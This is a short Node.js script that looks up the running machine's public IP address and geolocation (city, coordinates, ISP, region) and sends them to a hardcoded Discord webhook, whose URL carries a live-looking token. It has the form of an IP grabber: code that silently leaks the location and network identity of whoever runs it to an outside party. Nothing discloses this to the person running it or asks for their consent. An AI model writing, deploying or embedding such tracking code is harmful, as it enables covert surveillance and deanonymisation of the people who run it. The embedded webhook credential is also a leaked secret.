const fetch = require('node-fetch');

// Function to fetch IP data from ip-api.com
async function fetchIPData() {
    try {
        const response = await fetch('http://ip-api.com/json/');
        if (!response.ok) {
            throw new Error('Failed to fetch IP data');
        }
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching IP data:', error);
        return null;
    }
}

// Function to send data to Discord webhook
async function sendToDiscordWebhook(ipData) {
    try {
        const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-';
        const payload = {
            content: `IP Data:
Country: ${ipData.country}
IP: ${ipData.query}
Country Code: ${ipData.countryCode}
Region: ${ipData.region}
Region Name: ${ipData.regionName}
City: ${ipData.city}
Zip: ${ipData.zip}
Latitude: ${ipData.lat}
Longitude: ${ipData.lon}
Timezone: ${ipData.timezone}
ISP: ${ipData.isp}
Organization: ${ipData.org}
AS: ${ipData.as}`
        };

        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error('Failed to send data to Discord webhook');
        }
        console.log('Data sent to Discord webhook successfully');
    } catch (error) {
        console.error('Error sending data to Discord webhook:', error);
    }
}

// Main function to orchestrate the process
async function main() {
    const ipData = await fetchIPData();
    if (ipData) {
        sendToDiscordWebhook(ipData);
    }
}

// Run the main function
main();
